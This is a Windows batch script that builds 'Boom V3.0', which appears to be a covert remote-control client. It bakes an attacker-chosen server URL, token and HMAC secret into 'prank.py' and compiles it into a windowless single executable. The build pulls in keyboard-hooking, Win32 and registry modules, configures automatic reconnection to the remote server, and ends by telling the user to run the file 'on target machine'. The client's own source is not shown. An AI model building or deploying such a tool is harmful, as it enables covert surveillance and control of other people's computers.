@echo off
chcp 65001 >nul
echo ==============================================
echo   Boom V3.0 Build Tool (Windows)
echo ==============================================
echo.

set /p SERVER_URL="Server WS URL (e.g. wss://yourapp.up.railway.app/client): "
if "%SERVER_URL%"=="" set SERVER_URL=ws://127.0.0.1:18765/client

set /p AUTH_TOKEN="Auth Token: "
if "%AUTH_TOKEN%"=="" set AUTH_TOKEN=CHANGE_THIS

set /p HMAC_KEY="HMAC Secret: "
if "%HMAC_KEY%"=="" set HMAC_KEY=CHANGE_THIS

echo.
echo [1/4] Generating config...
python -c "import json; cfg={'client':{'server_url':'%SERVER_URL%','token':'%AUTH_TOKEN%','hmac_secret':'%HMAC_KEY%','reconnect_min_delay':2,'reconnect_max_delay':120}}; open('temp_config.json','w',encoding='utf-8').write(json.dumps(cfg,indent=2))"

if errorlevel 1 (
    echo [ERROR] Failed to generate config. Check Python is installed.
    pause
    exit /b 1
)

echo [2/4] Installing dependencies...
pip install pyinstaller websocket-client pywin32 keyboard

echo [3/4] Building EXE...
pyinstaller --noconsole --onefile --add-data "temp_config.json;." --name boom_v3_client --hidden-import=keyboard --hidden-import=websocket --hidden-import=websocket._app --hidden-import=websocket._core --hidden-import=websocket._http --hidden-import=websocket._abnf --hidden-import=websocket._socket --hidden-import=websocket._url --hidden-import=websocket._handshake --hidden-import=websocket._logging --hidden-import=websocket._exceptions --hidden-import=win32gui --hidden-import=win32api --hidden-import=win32con --hidden-import=pywintypes --hidden-import=pythoncom --hidden-import=tkinter --hidden-import=winreg prank.py

if errorlevel 1 (
    echo [ERROR] Build failed.
    del /q temp_config.json 2>nul
    pause
    exit /b 1
)

echo [4/4] Cleaning up...
del /q temp_config.json 2>nul
rmdir /s /q build 2>nul
del /q boom_v3_client.spec 2>nul

echo.
echo ==============================================
echo   SUCCESS! EXE is in the dist\ folder.
echo   Run boom_v3_client.exe on target machine.
echo ==============================================
pause
